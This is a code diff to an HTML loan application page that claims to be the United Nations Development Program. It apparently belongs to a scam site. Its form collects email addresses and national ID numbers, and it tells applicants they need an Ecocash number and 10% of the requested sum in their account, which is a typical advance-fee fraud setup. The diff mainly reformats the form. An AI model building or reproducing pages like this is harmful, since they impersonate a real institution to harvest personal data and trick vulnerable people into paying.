@@ -46,52 +46,7 @@ button { width: 100%; padding: 12px; background: red; color: white; border: none
      <h1>United Nations Development Program</h1>  
     </div>
 
-    <form id="loanForm" action="details.html">
-        <label>Promotion Amount (USD)</label>
-        <input id="loanAmount" type="number" required placeholder="MINIMUM 500 - MAXIMUM 20000">
-
-        <label>Email Address</label>
-        <input id="email" type="email" placeholder="example@gmail.com" required>
-
-        <label>National ID Number</label>
-        <input id="nationalId" type="text" placeholder="National ID">
-
-        <!-- <label>Repayment Period</label>
-        <select id="repaymentPeriod" required>
-            <option value="">Select</option>
-            <option value="7days">7 Days (interest 1.5%)</option>
-            <option value="14days">14 Days (interest 2.5%)</option>
-            <option value="21days">21 Days (interest 3.5%)</option>
-            <option value="30days">30 Days (interest 4.5%)</option>
-            <option value="60days">60 Days (interest 6%)</option>
-            <option value="90days">90 Days (interest 10%)</option>
-        </select> -->
-
-        <label>Employment Status</label>
-        <select id="employmentStatus" required>
-            <option value="">Select</option>
-            <option value="employed">Employed</option>
-            <option value="self-employed">Self-employed</option>
-            <option value="unemployed">Unemployed</option>
-            <option value="student">Student</option>
-        </select>
-
-        <label>Funds Purpose</label>
-        <select id="loanPurpose" required>
-            <option value="">Select</option>
-            <option value="business">Business</option>
-            <option value="personal">Personal Loan</option>
-            <option value="schoolfees">School Fees</option>
-            <option value="medical">Medical</option>
-            <option value="others">Others</option>
-        </select>
-
-        <div class="loan-notice">
-            <strong>Eligibility Notice:</strong>
-            <ol>
-                <li>You must apply using a valid Ecocash number</li>
-                <li>You must have at least 10% of the requested amount in your Ecocash account</li>
-            </ol>
+    <form id="loanForm"> <label>Promotion Amount (USD)</label> <input id="loanAmount" type="number" required placeholder="MINIMUM 500 - MAXIMUM 20000"> <label>Email Address</label> <input id="email" type="email" placeholder="example@gmail.com" required> <label>National ID Number</label> <input id="nationalId" type="text" placeholder="National ID"> <label>Employment Status</label> <select id="employmentStatus" required> <option value="">Select</option> <option value="employed">Employed</option> <option value="self-employed">Self-employed</option> <option value="unemployed">Unemployed</option> <option value="student">Student</option> </select> <label>Funds Purpose</label> <select id="loanPurpose" required> <option value="">Select</option> <option value="business">Business</option> <option value="personal">Personal Loan</option> <option value="schoolfees">School Fees</option> <option value="medical">Medical</option> <option value="others">Others</option> </select> <div class="loan-notice"> <strong>Eligibility Notice:</strong> <ol> <li>You must apply using a valid Ecocash number</li> <li>You must have at least 10% of the requested amount in your Ecocash account</li> </ol>
         </div>
 
         <button type="submit">Continue</button>
